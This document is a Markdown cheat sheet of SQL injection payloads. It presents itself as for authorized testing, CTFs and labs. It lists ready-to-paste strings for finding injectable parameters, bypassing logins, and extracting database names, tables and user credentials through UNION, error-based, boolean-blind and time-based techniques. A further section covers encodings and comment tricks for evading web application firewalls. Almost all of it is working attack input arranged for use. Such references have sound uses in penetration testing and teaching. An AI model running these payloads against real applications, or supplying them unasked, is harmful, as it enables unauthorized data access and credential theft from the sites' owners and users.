# SQL Injection Payloads

> **Authorized use only** — CTFs, lab environments and systems you own or have written permission to test.

## Detection

First step — find injectable parameters:

```
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
" OR 1=1--
```

**Signs of SQLi:**
- SQL error messages (MySQL, MSSQL, ORA- prefixes)
- Generic 500 error only on specific input
- Different page content with `' OR 1=1--` vs `' OR 1=2--`
- Response time difference with `SLEEP(5)`

---

## Basic — Authentication Bypass

**When to use:** Login forms with direct SQL query construction  
**Platform:** Any  
**Risk of detection:** High (common signatures)

```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
' OR 1=1#
admin'--
admin'/*
' OR 'x'='x
') OR ('1'='1
```

**Notes:** Works when query is built like:
`SELECT * FROM users WHERE user='$input' AND pass='$pass'`
The `--` and `#` comment out the rest of the query.

---

## UNION SELECT — Data Extraction

**When to use:** When output is reflected in the page  
**Platform:** MySQL / SQLite / PostgreSQL  
**Risk of detection:** Medium

### Step 1 — Find number of columns

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← error here means 2 columns
```

Alternative (NULL method):
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Step 2 — Find visible columns

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### Step 3 — Extract data

```sql
-- MySQL: database, version, user
' UNION SELECT database(),version(),user()--

-- MySQL: list tables
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

-- MySQL: list columns
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- MySQL: extract credentials
' UNION SELECT username,password FROM users--

-- PostgreSQL: version
' UNION SELECT version(),NULL--

-- PostgreSQL: tables
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--

-- MSSQL: version
' UNION SELECT @@version,NULL--

-- MSSQL: tables
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

---

## Error-Based — Extract via Error Messages

**When to use:** No output reflected but SQL errors visible  
**Platform:** MySQL / MSSQL / PostgreSQL  
**Risk of detection:** Medium

### MySQL

```sql
-- Extract via updatexml
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)--
' AND updatexml(1,concat(0x7e,(SELECT group_concat(username,':',password) FROM users),0x7e),1)--

-- Extract via extractvalue
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
```

### MSSQL

```sql
' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=convert(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--
```

---

## Blind Boolean-Based

**When to use:** No error messages, no reflected output, but page behaves differently  
**Platform:** Any  
**Risk of detection:** Low (slow, generates many requests)

```sql
-- Test: true vs false
' AND 1=1--     ← normal page
' AND 1=2--     ← different page = blind SQLi confirmed

-- Extract char by char
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='b'--
-- ... automate with sqlmap or a script

-- Extract DB name char by char
' AND SUBSTRING(database(),1,1)='a'--
' AND ASCII(SUBSTRING(database(),1,1))>97--

-- Count rows
' AND (SELECT COUNT(*) FROM users)>0--
```

---

## Blind Time-Based

**When to use:** No visible difference in response — use timing  
**Platform:** MySQL / MSSQL / PostgreSQL  
**Risk of detection:** Low but slow

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

---

## WAF Bypass

**When to use:** Standard payloads are blocked  
**Platform:** Any  
**Risk of detection:** Varies

### Comment obfuscation

```sql
-- MySQL comments inside keywords
UN/**/ION SE/**/LECT
UN/*comment*/ION/*comment*/SELECT
UN/*!ION*/SELECT
```

### Case variation

```sql
uNiOn SeLeCt
UnIoN sElEcT
UNION%20SELECT
```

### URL encoding

```sql
%27 OR %271%27=%271
%27%20OR%20%271%27%3D%271
```

### Double URL encoding

```sql
%2527 OR 1=1--
```

### Whitespace bypass

```sql
-- Use tab, newline, carriage return instead of space
'%09OR%091=1--
'%0aOR%0a1=1--
'%0dOR%0d1=1--
UNION%0aSELECT%0aNULL--

-- MySQL: use parentheses
'OR(1)=(1)--
UNION(SELECT(NULL),(NULL))
```

### Keyword bypass

```sql
-- When UNION is filtered
' OORR 1=1--
' /*!UNION*/ SELECT NULL--
' UNION%00SELECT NULL--
```

---

## Useful Functions Reference

| DB | Version | Current DB | Current User |
|----|---------|------------|--------------|
| MySQL | `version()` | `database()` | `user()` |
| PostgreSQL | `version()` | `current_database()` | `current_user` |
| MSSQL | `@@version` | `DB_NAME()` | `SYSTEM_USER` |
| SQLite | `sqlite_version()` | — | — |
| Oracle | `v$version` | `ora_database_name` | `user` |
